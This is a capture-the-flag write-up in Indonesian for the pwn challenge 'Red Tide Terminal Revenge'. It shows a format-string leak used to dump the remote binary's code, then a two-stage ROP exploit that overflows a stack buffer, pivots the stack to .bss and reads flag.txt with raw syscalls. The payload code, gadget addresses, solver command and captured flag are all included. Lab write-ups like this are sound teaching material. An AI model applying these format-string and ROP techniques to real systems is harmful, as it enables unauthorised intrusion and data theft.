# Red Tide Terminal Revenge

**Category:** Pwn  
**CTF:** JuniorCrypt 2026  
**Flag:** `grodno{8f60ac24-abc0-4130-a6e2-77c40558363c}`

## Ringkasan

Service menerima codename, audit note, panjang packet, lalu data packet. Attachment lokal dan binary remote ternyata berbeda build. Attachment lokal memakai PIE dan stack canary, sedangkan `route_packet` pada remote memakai alamat kode tetap, buffer stack `0x50`, batas input `0xb0`, dan tidak memiliki stack canary.

Format string pada audit note dipakai untuk melakukan recon remote dan dump bagian `.text`. Dari dump tersebut ditemukan gadget ROP serta layout fungsi yang sebenarnya. Exploit akhir memakai buffer overflow dua tahap:

1. Stage 1 menjalankan `read(0, 0x404300, 0x400)` dan melakukan stack pivot ke `.bss`.
2. Stage 2 menjalankan ORW dengan syscall `openat`, `read`, dan `write` untuk mencetak `flag.txt`.

---

## 1. Recon attachment lokal

Binary attachment:

```bash
file red_tide_terminal_revenge
readelf -h red_tide_terminal_revenge
readelf -Ws red_tide_terminal_revenge | grep stack_chk
objdump -d -M intel --disassemble=route_packet red_tide_terminal_revenge
```

Hasil utama:

```text
ELF 64-bit LSB pie executable, x86-64
Type: DYN
Dynamically linked
Not stripped
Debug info tersedia
```

`route_packet` pada attachment lokal memiliki stack canary:

```asm
1590: push   rbp
1591: mov    rbp,rsp
1594: sub    rsp,0x60
1598: mov    rax,QWORD PTR fs:0x28
15a1: mov    QWORD PTR [rbp-0x8],rax
...
15ea: lea    rax,[rbp-0x50]
15f6: call   read@plt
...
1619: call   __stack_chk_fail@plt
```

Attachment tidak bisa langsung dijadikan acuan untuk remote karena proteksi dan alamat fungsi berbeda.

---

## 2. Format string dan fingerprint remote

Audit note diteruskan langsung ke `printf`, sehingga input seperti berikut membocorkan isi stack:

```text
%19$p|%20$p|%21$p|%22$p|%23$p|%24$p
```

Contoh output remote:

```text
%19$p = 0xa702434
%20$p = 0x7fff3bef468a
%21$p = 0x7692f5455000
%22$p = 0x7fff3beb42f0
%23$p = 0x401640
%24$p = 0x7fff3beb4390
```

Alamat `0x401640` menunjukkan binary remote non-PIE. Nilai tersebut konsisten pada koneksi berbeda, berbeda dengan attachment lokal yang seharusnya mempunyai base acak `0x55...`.

Percobaan awal mencari canary dari leak ini gagal karena remote bukan sekadar attachment dengan index format string berbeda. Build remote memang memiliki layout lain.

---

## 3. Dump `.text` remote

Format string dapat dinaikkan menjadi arbitrary read memakai `%N$s`. Pointer target ditempatkan di dalam buffer audit note, kemudian dibaca menggunakan positional argument yang sesuai.

Range yang didump:

```text
0x401300 - 0x401700
```

File hasil dump disimpan sebagai:

```text
remote_text.bin
```

Pencarian opcode menghasilkan gadget berikut:

```text
pop rdi ; ret    : 0x4013ec
pop rsi ; ret    : 0x4013f5
pop rdx ; ret    : 0x4013fe
pop rax ; ret    : 0x401407
syscall ; ret    : 0x401410
leave ; ret      : 0x4013e6, 0x40141a, 0x4014c3,
                   0x40156e, 0x4015cb, 0x401613
```

Gadget eksploitasi yang dipakai:

```python
POP_RDI     = 0x4013EC
POP_RSI     = 0x4013F5
POP_RDX     = 0x4013FE
POP_RAX     = 0x401407
SYSCALL_RET = 0x401410
LEAVE_RET   = 0x4013E6
```

---

## 4. Analisis `route_packet` remote

Disassembly hasil dump remote:

```asm
401570: endbr64
401574: push   rbp
401575: mov    rbp,rsp
401578: sub    rsp,0x50
40157c: mov    edi,0x40204a
401581: call   0x4010c0
401586: call   0x401484
40158b: mov    DWORD PTR [rbp-0x4],eax
40158e: cmp    DWORD PTR [rbp-0x4],0xb0
401595: jbe    0x4015a3
...
4015ad: mov    edx,DWORD PTR [rbp-0x4]
4015b0: lea    rax,[rbp-0x50]
4015b4: mov    rsi,rax
4015b7: mov    edi,0
4015bc: call   0x4010e0
...
4015cb: leave
4015cc: ret
```

Layout stack remote:

```text
rbp-0x50  packet buffer
rbp       saved RBP
rbp+0x08  saved RIP
```

Offset penting:

```text
saved RBP = 0x50
saved RIP = 0x58
```

Panjang input maksimum:

```text
0xb0 bytes
```

Buffer hanya `0x50` byte, jadi tersedia overflow sampai:

```text
0xb0 - 0x50 = 0x60 bytes
```

Tidak ada pembacaan `fs:0x28` dan tidak ada pemanggilan `__stack_chk_fail` di fungsi remote. Payload yang menyisipkan canary palsu akan menggeser chain dan gagal.

---

## 5. Strategi exploit

NX mencegah eksekusi shellcode langsung. Binary menyediakan gadget register dan `syscall ; ret`, jadi ROP dua tahap lebih stabil.

Alamat writable yang dipakai:

```python
STAGE2_ADDR = 0x404300
PATH_ADDR   = 0x404600
IO_ADDR     = 0x404800
```

Stage 1 harus muat di batas packet `0xb0`. Chain lengkap berukuran `0xa8`.

---

## 6. Stage 1 — read dan stack pivot

Payload dimulai dengan padding sampai saved RBP:

```python
payload  = b"A" * 0x50
payload += p64(0x404300)
```

Saved RBP diganti dengan alamat `.bss`. Saved RIP dan qword berikutnya berisi chain:

```python
payload += flat(
    POP_RDI, 0,
    POP_RSI, STAGE2_ADDR,
    POP_RDX, 0x400,
    POP_RAX, 0,
    SYSCALL_RET,
    LEAVE_RET,
)
```

Syscall pertama:

```c
read(0, 0x404300, 0x400);
```

Setelah data stage 2 masuk, `leave ; ret` melakukan:

```text
rsp = rbp = 0x404300
rbp = *(0x404300)
rip = *(0x404308)
```

Qword pertama pada stage 2 menjadi fake RBP, dan gadget pertama ditempatkan mulai `0x404308`.

Ukuran akhir stage 1:

```text
0xa8 bytes
```

Nilai ini masih di bawah batas `0xb0`.

---

## 7. Stage 2 — ORW

Seccomp/service tidak perlu dibypass menggunakan shell. Flag dibaca langsung memakai syscall file I/O.

### `openat`

```c
openat(AT_FDCWD, "flag.txt", O_RDONLY, 0);
```

Register:

```text
rax = 257
rdi = -100
rsi = 0x404600
rdx = 0
```

### `read`

Descriptor hasil `openat` diasumsikan `3` karena `stdin`, `stdout`, dan `stderr` sudah memakai descriptor `0`, `1`, dan `2`.

```c
read(3, 0x404800, 0x100);
```

Register:

```text
rax = 0
rdi = 3
rsi = 0x404800
rdx = 0x100
```

### `write`

```c
write(1, 0x404800, 0x100);
```

Register:

```text
rax = 1
rdi = 1
rsi = 0x404800
rdx = 0x100
```

Chain diakhiri dengan:

```c
exit(0);
```

Path `flag.txt` diletakkan pada offset `0x300` dari awal stage 2:

```python
stage2 = chain.ljust(0x300, b"B")
stage2 += b"flag.txt\x00"
stage2 = stage2.ljust(0x400, b"\x00")
```

---

## 8. Sinkronisasi pengiriman

Stage 1 dan stage 2 dikirim dalam satu operasi:

```python
io.send(stage1 + stage2)
```

`route_packet` meminta tepat `0xa8` byte, sehingga syscall `read` pertama mengambil stage 1 saja. Stage 2 tetap berada di receive queue socket.

Ketika eksekusi berpindah ke ROP, syscall berikutnya mengambil sisa data:

```c
read(0, 0x404300, 0x400);
```

Cara ini menghindari race condition saat menunggu output `Packet queued.` sebelum mengirim stage 2.

---

## 9. Menjalankan solver

```bash
python3 solve.py HOST PORT
```

Contoh:

```bash
python3 solve.py 10.112.0.12 49982
```

Output akhir:

```text
[*] solver version: revenge-buffer-0x50-final
[*] path    = b'flag.txt'
[*] stage-1 = 0xa8
[*] stage-2 = 0x400
<FLAG>grodno{8f60ac24-abc0-4130-a6e2-77c40558363c}</FLAG>
```

## Flag

```text
grodno{8f60ac24-abc0-4130-a6e2-77c40558363c}
```
